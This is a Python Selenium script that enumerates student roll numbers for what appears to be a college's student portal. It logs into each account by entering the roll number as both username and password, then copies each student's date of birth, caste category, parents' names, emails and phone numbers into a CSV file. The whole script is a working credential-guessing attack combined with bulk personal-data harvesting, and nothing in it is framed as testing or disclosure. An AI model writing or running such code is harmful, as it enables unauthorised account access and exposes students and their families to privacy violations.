from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import time
import csv

#Rolls list generation
r='16911A0'
rolls=[]
for b in range(3,6):
    ro=r+str(b)
    for i in range (1,100):
        if(i<10):
            roll=ro+str(0)+str(i)
        else:
            roll=ro+str(i)
        rolls.append(roll)
    for c in range(65,81):
        if(c==73 or c==79):
            continue
        for i in range(0,10):
            roll=ro+str(chr(c))+str(i)
            rolls.append(roll)
    rolls.append(ro+'Q0')

driver = webdriver.Chrome(ChromeDriverManager().install())
driver.get('http://vjitautonomous.com/')
count=0
with open('Vjit16DBfinals.csv', 'a', newline='') as csvfile:
    if(count>=100):
        driver = webdriver.Chrome(ChromeDriverManager().install())
        driver.get('http://vjitautonomous.com/')
        count =0
    count=count+1
    fieldnames = ['Roll number', 'Admin Date','Batch','DOB','CasteCategory','Name','Father Name','Mother Name','Student Email','Parent Mobile No','Student Mobile No','Roll copy']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for varroll in rolls:
        try:
            # click button
            submit_button = driver.find_elements_by_xpath('//*[@id="lnkLogins"]')[0]
            submit_button.click()
            time.sleep(0.5)
            submit_butn = driver.find_elements_by_xpath('//*[@id="lnkStudent"]')[0]
            submit_butn.click()

            #text
            # type text
            text_area = driver.find_element_by_id('txtUserId')
            text_area.send_keys(varroll)
            text_area = driver.find_element_by_id('txtPwd')
            text_area.send_keys(varroll)

            #login
            submit_butn = driver.find_elements_by_xpath('//*[@id="btnLogin"]')[0]
            submit_butn.click()

            #basic info

            submit_butn = driver.find_elements_by_xpath('//*[@id="lnkStuInfo"]')[0]
            submit_butn.click()
            #roll
            input = driver.find_element_by_name("ctl00$cpStudCorner$txtHTNo")
            roll=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtAdminDate")
            date=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtBatch")
            batch=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtDOB")
            dob=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtCasteCategory")
            caste=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtName")
            name=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtParentName")
            fname=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtMotherName")
            mname=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtStuEmail")
            mail=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtParentMblNo")
            pno=input.get_attribute('value')

            input = driver.find_element_by_name("ctl00$cpStudCorner$txtStuMblNo")
            sno=input.get_attribute('value')

            writer.writerow({'Roll number':roll, 'Admin Date':date,'Batch':batch,'DOB':dob,'CasteCategory':caste,'Name':name,'Father Name':fname,'Mother Name':mname,'Student Email':mail,'Parent Mobile No':pno,'Student Mobile No':sno,'Roll copy':varroll})

            #logout
            submit_button = driver.find_elements_by_xpath('//*[@id="btnLogout"]')[0]
            submit_button.click()
        except:
            pass
driver.close()
